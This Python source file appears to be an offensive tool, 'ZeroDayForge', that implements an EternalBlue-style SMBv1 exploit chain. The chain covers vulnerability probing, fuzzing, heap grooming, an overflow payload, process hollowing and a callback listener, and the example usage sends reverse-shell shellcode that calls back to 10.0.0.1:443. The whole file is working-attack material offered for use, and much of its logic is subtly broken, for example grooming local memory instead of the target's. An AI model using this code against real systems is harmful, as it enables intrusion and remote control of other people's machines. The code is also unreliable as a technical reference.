import socket
import struct
import logging
import json
import os
import re
from enum import Enum
from core.fuzzer import ProtocolFuzzer, Protocol
from core.heap_exploit import Win32HeapExploit
from payloads.process_inject import ProcessInjector
from payloads.shellcode_asm import ShellcodeGenerator

# Custom Exceptions
class SMBExploitError(Exception):
	"""Custom exception for SMB exploitation failures"""
	pass

# Main Exploiter Class
class SMBExploiter:
	def __init__(self, target_ip, callback_port=4444):
		self.target_ip = target_ip
		self.callback_port = callback_port
		self.logger = logging.getLogger('ZeroDayForge.SMB')
		self.logger.setLevel(logging.DEBUG)
		
		# Initialize components
		self.fuzzer = ProtocolFuzzer(target_ip, 445, Protocol.SMBv1)
		self.heap = Win32HeapExploit()
		self.injector = ProcessInjector()
		
		# Load offset patterns
		self.patterns = self._load_patterns()
		self.logger.debug(f"Loaded {len(self.patterns)} SMB offset patterns")

	def _load_patterns(self):
		"""Load offset patterns from external JSON config"""
		try:
			config_path = os.path.join(os.path.dirname(__file__), 'config', 'smb_patterns.json')
			with open(config_path) as f:
				return json.load(f)
		except Exception as e:
			self.logger.error(f"Failed to load patterns: {str(e)}")
			return []

	def check_vulnerability(self):
		"""Verify SMBv1 vulnerability"""
		self.logger.info(f"Checking SMBv1 vulnerability on {self.target_ip}")
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(3)
				s.connect((self.target_ip, 445))
				s.send(b"\x00\x00\x00\x85\xff\x53\x4d\x42")  # SMBv1 negotiate
				response = s.recv(1024)
				return b"SMBv1" in response
		except Exception as e:
			raise SMBExploitError(f"Vulnerability check failed: {str(e)}")

	def eternal_blue_chain(self, shellcode):
		"""Full exploitation chain with validation"""
		try:
			# Initial checks
			if not self.check_vulnerability():
				raise SMBExploitError("Target not vulnerable to SMBv1 exploits")
			
			self.logger.debug("Starting fuzzing phase")
			crash_points = self.fuzzer.fuzz(iterations=500)
			
			# Heap grooming with verification
			self.logger.info("Grooming heap memory")
			self.heap.create_heap()
			allocations = self.heap.alloc_free_cycle(count=32)
			
			# Write verification marker
			marker = os.urandom(8)
			self.heap.write_fake_chunk(allocations[4], marker)
			if not self.heap.read_memory(allocations[4], len(marker)) == marker:
				raise SMBExploitError("Heap grooming verification failed")
			
			# Create version-specific payload
			self.logger.debug("Crafting version-aware payload")
			overflow = self._craft_versioned_payload(allocations[4], shellcode)
			
			# Send final payload
			self.logger.info("Sending exploit payload")
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.connect((self.target_ip, 445))
				s.send(overflow)
			
			# Post-exploitation
			self.logger.debug("Starting post-exploitation phase")
			self.injector.hollow_process(shellcode)
			
			# Validate execution
			if not self._validate_execution():
				self.logger.warning("Shellcode execution unconfirmed")
			
			return True
			
		except Exception as e:
			self.logger.error(f"Exploit chain failed: {str(e)}")
			return False

	def _craft_versioned_payload(self, heap_addr, sc):
		"""Create dynamic payload based on server version"""
		response = self._send_probe()
		offset = self._find_offset(response)
		
		return (
			b"\x00\x00" + struct.pack("<H", 0x1000) +
			response[:4] + b"\x00"*offset +
			struct.pack("<Q", heap_addr) * (0x1000//8) +
			sc
		)

	def _send_probe(self):
		"""Get server version information"""
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(3)
				s.connect((self.target_ip, 445))
				s.send(b"\x00\x00\x00\x85\xff\x53\x4d\x42")
				return s.recv(1024)
		except Exception as e:
			raise SMBExploitError(f"Probe failed: {str(e)}")

	def _find_offset(self, response):
		"""Detect offset using pattern matching"""
		self.logger.debug("Analyzing server response for offset detection")
		
		# Try configured patterns first
		for pattern in self.patterns:
			if re.search(pattern['signature'], response, re.IGNORECASE):
				self.logger.info(f"Matched pattern: {pattern['name']} (offset: {pattern['offset']})")
				return pattern['offset']
		
		# Fallback: Dump response and use default
		self.logger.error("No pattern matched - dumping response")
		dump_path = f"smb_response_{self.target_ip}.bin"
		with open(dump_path, "wb") as f:
			f.write(response)
		self.logger.info(f"Response dumped to {dump_path}")
		return 128  # Safe default

	def _validate_execution(self):
		"""Confirm shellcode execution via callback"""
		self.logger.info(f"Listening for callback on port {self.callback_port}")
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.settimeout(30)
			s.bind(('0.0.0.0', self.callback_port))
			s.listen(1)
			
			try:
				conn, addr = s.accept()
				self.logger.info(f"Received callback from {addr[0]} - exploit confirmed")
				conn.close()
				return True
			except socket.timeout:
				self.logger.warning("No callback received")
				return False

# Example Usage
if __name__ == "__main__":
	logging.basicConfig(level=logging.DEBUG)
	
	exploiter = SMBExploiter("192.168.1.100", callback_port=5555)
	generator = ShellcodeGenerator('x64')
	
	try:
		sc = generator.generate_reverse_shell("10.0.0.1", 443)
		if exploiter.eternal_blue_chain(sc):
			print("Exploit succeeded!")
	except Exception as e:
		print(f"Exploit failed: {str(e)}")